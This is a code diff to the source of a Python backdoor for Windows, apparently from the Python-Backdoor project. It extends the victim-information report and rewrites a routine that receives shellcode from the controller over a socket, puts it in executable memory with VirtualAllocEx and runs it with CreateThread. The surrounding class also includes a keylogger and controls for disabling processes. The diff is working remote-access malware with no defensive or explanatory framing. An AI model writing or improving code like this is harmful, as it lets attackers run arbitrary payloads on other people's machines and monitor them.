@@ -5,7 +5,7 @@ https://github.com/xp4xbox/Python-Backdoor
 
 license: https://github.com/xp4xbox/Python-Backdoor/blob/master/license
 """
-
+import base64
 import ctypes
 import socket
 import subprocess
@@ -42,7 +42,8 @@ def get_info():
 
     info = {"username": os.environ["USERNAME"], "hostname": _hostname, "platform": _platform,
             "is_admin": bool(ctypes.windll.shell32.IsUserAnAdmin()), "architecture": platform.architecture(),
-            "machine": platform.machine(), "processor": platform.processor()}
+            "machine": platform.machine(), "processor": platform.processor(),
+            "x64_python": ctypes.sizeof(ctypes.c_voidp) == 8}
 
     return info
 
@@ -53,31 +54,42 @@ class Control:
         self.logger = Keylogger()
         self.disabled_processes = {}
 
-    # currently, only works on x86 python, currently no solution including one below has worked with x64
-    # https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
-    def inject(self, shellcode):
-        if ctypes.sizeof(ctypes.c_voidp) != 4:
-            self.socket.send_json(ERROR, "This feature is only supported with x86 python")
+    # tested on x86 and x64, shellcode must be generated using the same architecture as python interpreter
+    # x64 fix from https://stackoverflow.com/questions/60198918/virtualalloc-and-python-access-violation/61258392#61258392
+    def inject_shellcode(self, buffer):
+        shellcode = self.socket.recvall(buffer)
+
+        pid = os.getpid()
+
+        try:
+            shellcode = bytearray(shellcode.decode('unicode-escape').encode('ISO-8859-1'))
+
+            h_process = ctypes.windll.kernel32.OpenProcess(0x001F0FFF, False, int(pid))
+
+            if not h_process:
+                raise Exception(f"Could not aquire pid on {pid}")
+
+            ctypes.windll.kernel32.VirtualAllocEx.restype = ctypes.c_void_p
+            ctypes.windll.kernel32.RtlMoveMemory.argtypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
+            ctypes.windll.kernel32.CreateThread.argtypes = \
+                (ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int,
+                 ctypes.POINTER(ctypes.c_int))
+
+            ptr = ctypes.windll.kernel32.VirtualAllocEx(h_process, 0, ctypes.c_int(len(shellcode)),
+                                                        ctypes.c_int(0x3000),
+                                                        ctypes.c_int(0x40))
+
+            buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
+
+            ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode)))
+
+            ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ptr, ctypes.c_int(0),
+                                                ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
+
+        except Exception as e:
+            self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
         else:
-            try:
-                shellcode = bytearray(shellcode)
-
-                ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
-                ctypes.windll.kernel32.RtlMoveMemory.argTypes = (ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t)
-
-                ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)),
-                                                          ctypes.c_int(0x3000), ctypes.c_int(0x40))
-
-                buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
-
-                ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), buf, ctypes.c_size_t(len(shellcode)))
-
-                ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0),
-                                                    ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
-            except Exception as e:
-                self.socket.send_json(ERROR, f"Error injecting shellcode {e}")
-            else:
-                self.socket.send_json(SUCCESS)
+            self.socket.send_json(SUCCESS)
 
     def toggle_disable_process(self, process):
         process = process.lower()
